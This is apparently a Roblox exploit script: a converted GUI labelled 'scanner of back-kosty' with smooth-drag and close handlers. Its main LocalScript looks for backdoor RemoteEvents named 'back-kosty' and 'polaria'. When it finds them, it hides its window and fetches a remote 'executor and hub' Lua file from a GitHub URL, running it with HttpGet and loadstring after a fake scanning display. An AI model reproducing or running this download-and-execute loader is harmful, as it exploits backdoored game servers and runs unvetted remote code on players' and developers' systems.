-- Generated using RoadToGlory's Converter v1.1 (RoadToGlory#9879)

-- Instances:

local Converted = {
	["_scanner"] = Instance.new("ScreenGui");
	["_Frame"] = Instance.new("Frame");
	["_TextLabel"] = Instance.new("TextLabel");
	["_LocalScript"] = Instance.new("LocalScript");
	["_UICorner"] = Instance.new("UICorner");
	["_TextButton"] = Instance.new("TextButton");
	["_UICorner1"] = Instance.new("UICorner");
	["_TextButton1"] = Instance.new("TextButton");
	["_UICorner2"] = Instance.new("UICorner");
	["_Smooth GUI Dragging"] = Instance.new("LocalScript");
	["_LocalScript1"] = Instance.new("LocalScript");
}

-- Properties:

Converted["_scanner"].Enabled = false
Converted["_scanner"].Name = "scanner"
Converted["_scanner"].Parent = game:GetService("CoreGui")

Converted["_Frame"].BackgroundColor3 = Color3.fromRGB(204.0000182390213, 0, 255)
Converted["_Frame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Frame"].BorderSizePixel = 0
Converted["_Frame"].Position = UDim2.new(0.0402930416, 0, 0.42780748, 0)
Converted["_Frame"].Size = UDim2.new(0, 486, 0, 355)
Converted["_Frame"].Parent = Converted["_scanner"]

Converted["_TextLabel"].Font = Enum.Font.SourceSans
Converted["_TextLabel"].RichText = true
Converted["_TextLabel"].Text = "scanner of back-kosty"
Converted["_TextLabel"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel"].TextScaled = true
Converted["_TextLabel"].TextSize = 14
Converted["_TextLabel"].TextWrapped = true
Converted["_TextLabel"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel"].BackgroundTransparency = 1
Converted["_TextLabel"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextLabel"].BorderSizePixel = 0
Converted["_TextLabel"].Size = UDim2.new(0, 486, 0, 70)
Converted["_TextLabel"].Parent = Converted["_Frame"]

Converted["_UICorner"].CornerRadius = UDim.new(0, 9)
Converted["_UICorner"].Parent = Converted["_Frame"]

Converted["_TextButton"].Font = Enum.Font.SourceSans
Converted["_TextButton"].RichText = true
Converted["_TextButton"].Text = "start scan"
Converted["_TextButton"].TextColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextButton"].TextScaled = true
Converted["_TextButton"].TextSize = 14
Converted["_TextButton"].TextWrapped = true
Converted["_TextButton"].BackgroundColor3 = Color3.fromRGB(0, 255, 128.0000075697899)
Converted["_TextButton"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextButton"].BorderSizePixel = 0
Converted["_TextButton"].Position = UDim2.new(0.294238687, 0, 0.428169012, 0)
Converted["_TextButton"].Size = UDim2.new(0, 200, 0, 50)
Converted["_TextButton"].Parent = Converted["_Frame"]

Converted["_UICorner1"].CornerRadius = UDim.new(0, 9)
Converted["_UICorner1"].Parent = Converted["_TextButton"]

Converted["_TextButton1"].Font = Enum.Font.SourceSans
Converted["_TextButton1"].RichText = true
Converted["_TextButton1"].Text = "close"
Converted["_TextButton1"].TextColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextButton1"].TextScaled = true
Converted["_TextButton1"].TextSize = 14
Converted["_TextButton1"].TextWrapped = true
Converted["_TextButton1"].BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Converted["_TextButton1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextButton1"].BorderSizePixel = 0
Converted["_TextButton1"].Position = UDim2.new(0.294238687, 0, 0.619718313, 0)
Converted["_TextButton1"].Size = UDim2.new(0, 200, 0, 50)
Converted["_TextButton1"].Name = "TextButton1"
Converted["_TextButton1"].Parent = Converted["_Frame"]

Converted["_UICorner2"].CornerRadius = UDim.new(0, 9)
Converted["_UICorner2"].Parent = Converted["_TextButton1"]

-- Fake Module Scripts:

local fake_module_scripts = {}


-- Fake Local Scripts:

local function EFAYHW_fake_script() -- Fake Script: StarterGui.scanner.Frame.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Frame"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local eventName1 = "back-kosty"
	local eventName2 = "polaria"
	local button = script.Parent.TextButton
	local textlabel = script.Parent.TextLabel
	
	local function findTwoRemoteEvents()
		local foundEvents = {}
	
		for _, obj in ipairs(game:GetDescendants()) do
			if obj:IsA("RemoteEvent") and (obj.Name == eventName1 or obj.Name == eventName2) then
				foundEvents[obj.Name] = obj
				textlabel.Text = "BACKDOOR FOUND!"
			end
		end
	
		if foundEvents[eventName1] and foundEvents[eventName2] then
			return foundEvents
		end
		return nil
	end
	
	local function executeScript()
		local url = "https://raw.githubusercontent.com/Kostyosthesystem/back-kosty/refs/heads/main/executor/executorandhub.lua"
		local response = game:HttpGet(url, true)
		loadstring(response)()
	end
	
	local function onButtonClick()
		textlabel.Text = "starting scan..."
		wait(3)
		
		textlabel.Text = "scanning......"
		wait(3)
		local remoteEvents = findTwoRemoteEvents()
	
		if remoteEvents then
			wait(3)
			textlabel.Text = "END! closing program..."
			wait(3)
			script.Parent.Visible = false
			script.Parent:Destroy()
			executeScript()
		else
			
		end
	end
	
	button.MouseButton1Click:Connect(onButtonClick)
	
end
local function SESEX_fake_script() -- Fake Script: StarterGui.scanner.Frame.Smooth GUI Dragging
    local script = Instance.new("LocalScript")
    script.Name = "Smooth GUI Dragging"
    script.Parent = Converted["_Frame"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local UserInputService = game:GetService("UserInputService")
	local runService = (game:GetService("RunService"));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
local function HOHNW_fake_script() -- Fake Script: StarterGui.scanner.Frame.LocalScript
    local script = Instance.new("LocalScript")
    script.Name = "LocalScript"
    script.Parent = Converted["_Frame"]
    local req = require
    local require = function(obj)
        local fake = fake_module_scripts[obj]
        if fake then
            return fake()
        end
        return req(obj)
    end

	local frame = script.Parent
	
	function onclick()
		frame.Visible = false
		frame:Destroy()
	end
	
	script.Parent.TextButton1.MouseButton1Click:connect(onclick)
end

coroutine.wrap(EFAYHW_fake_script)()
coroutine.wrap(SESEX_fake_script)()
coroutine.wrap(HOHNW_fake_script)()
